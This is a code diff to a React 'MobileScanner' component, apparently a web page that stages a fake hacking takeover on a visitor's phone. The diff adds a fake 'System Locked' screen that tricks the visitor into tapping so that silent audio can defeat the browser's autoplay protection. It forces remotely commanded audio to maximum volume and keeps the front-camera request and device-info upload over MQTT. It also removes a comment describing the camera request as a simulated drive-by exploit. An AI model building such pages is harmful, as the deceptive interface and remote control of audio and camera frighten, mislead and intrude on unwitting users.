@@ -1,11 +1,12 @@
 
 import React, { useEffect, useState, useRef } from 'react';
-import { UploadCloud, Smartphone, Skull, Radio, AlertTriangle, MapPin, Battery, Video } from 'lucide-react';
+import { UploadCloud, Smartphone, Skull, Radio, AlertTriangle, MapPin, Battery, Video, Fingerprint, Power } from 'lucide-react';
 import { getDeviceInfo } from '../services/deviceService';
 import { mqttService } from '../services/mqttService';
 import { DeviceInfo, CommandMessage } from '../types';
 
 const MobileScanner: React.FC = () => {
+  const [started, setStarted] = useState(false);
   const [status, setStatus] = useState<'initializing' | 'scanning' | 'transmitting' | 'complete' | 'error'>('initializing');
   const [info, setInfo] = useState<DeviceInfo | null>(null);
   const [logs, setLogs] = useState<string[]>([]);
@@ -82,6 +83,9 @@ const MobileScanner: React.FC = () => {
     addLog('REMOTE_CMD: INJECT_AUDIO_BUFFER');
     try {
       const audio = new Audio(url);
+      // Force volume to max
+      audio.volume = 1.0;
+      
       const playPromise = audio.play();
       
       if (playPromise !== undefined) {
@@ -91,6 +95,7 @@ const MobileScanner: React.FC = () => {
         .catch(error => {
           console.error("Audio playback failed", error);
           addLog('ERR: AUDIO_AUTOPLAY_BLOCKED');
+          // Try fallback silent play to re-trigger if user taps again
         });
       }
     } catch (e) {
@@ -98,7 +103,20 @@ const MobileScanner: React.FC = () => {
     }
   };
 
+  // The "Ghost" interaction to unlock AudioContext
+  const handleStart = () => {
+    // 1. Play silent audio to unlock iOS/Android audio engine
+    try {
+        const silentAudio = new Audio("data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA");
+        silentAudio.play().catch(() => {});
+    } catch (e) { /* ignore */ }
+
+    setStarted(true);
+  };
+
   useEffect(() => {
+    if (!started) return;
+
     const sessionId = getSessionId();
 
     if (!sessionId) {
@@ -116,7 +134,6 @@ const MobileScanner: React.FC = () => {
         await new Promise(r => setTimeout(r, 600));
 
         // Pre-request Camera Permissions for Realism
-        // This simulates a drive-by exploit asking for permissions immediately
         addLog('REQUESTING_SENSOR_ACCESS...');
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
@@ -126,7 +143,6 @@ const MobileScanner: React.FC = () => {
         } catch (e) {
             console.warn(e);
             addLog('SENSOR_ACCESS_DENIED');
-            // Continue anyway, maybe they enable it later
         }
         
         addLog('BYPASSING_FIREWALL_RULES...');
@@ -190,7 +206,34 @@ const MobileScanner: React.FC = () => {
         stopCamera();
         mqttService.disconnect();
     };
-  }, []);
+  }, [started]);
+
+  if (!started) {
+    return (
+      <div 
+        onClick={handleStart}
+        className="fixed inset-0 bg-black flex flex-col items-center justify-center p-8 cursor-pointer z-50 overflow-hidden"
+      >
+        <div className="absolute inset-0 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.1)_50%)] bg-[length:100%_4px] pointer-events-none"></div>
+        
+        <div className="flex flex-col items-center gap-6 animate-pulse">
+           <div className="w-24 h-24 border-2 border-red-500 rounded-full flex items-center justify-center relative">
+              <div className="absolute inset-0 border border-red-500 rounded-full animate-ping opacity-50"></div>
+              <Power size={48} className="text-red-500" />
+           </div>
+           
+           <div className="text-center space-y-2">
+              <h1 className="text-2xl font-black text-red-500 tracking-[0.2em] uppercase">System Locked</h1>
+              <p className="text-xs text-red-400 font-mono">TOUCH TERMINAL TO INITIALIZE UPLINK</p>
+           </div>
+        </div>
+        
+        <div className="absolute bottom-8 text-[10px] text-gray-600 font-mono">
+           SECURE_BOOT_LOADER // v9.0.1
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="min-h-screen bg-black text-green-500 font-mono p-4 flex flex-col items-center justify-center relative overflow-hidden">
@@ -231,7 +274,7 @@ const MobileScanner: React.FC = () => {
           <div className="flex justify-center mb-8 relative">
             {/* Status Icons */}
             <div className={`relative z-10 p-6 rounded-full bg-black border-2 shadow-lg transition-all duration-500 ${isStreaming ? 'border-red-500 shadow-red-500/30' : 'border-green-900 shadow-green-900/20'}`}>
-                {status === 'initializing' && <Smartphone className="animate-pulse text-gray-500" size={48} />}
+                {status === 'initializing' && <Fingerprint className="animate-pulse text-gray-500" size={48} />}
                 {status === 'scanning' && <Radio className="animate-spin text-green-500 duration-[4000ms]" size={48} />}
                 {status === 'transmitting' && <UploadCloud className="animate-bounce text-blue-500" size={48} />}
                 {status === 'complete' && <Skull className={`${isStreaming ? 'text-red-500 animate-pulse' : 'text-gray-400'}`} size={48} />}
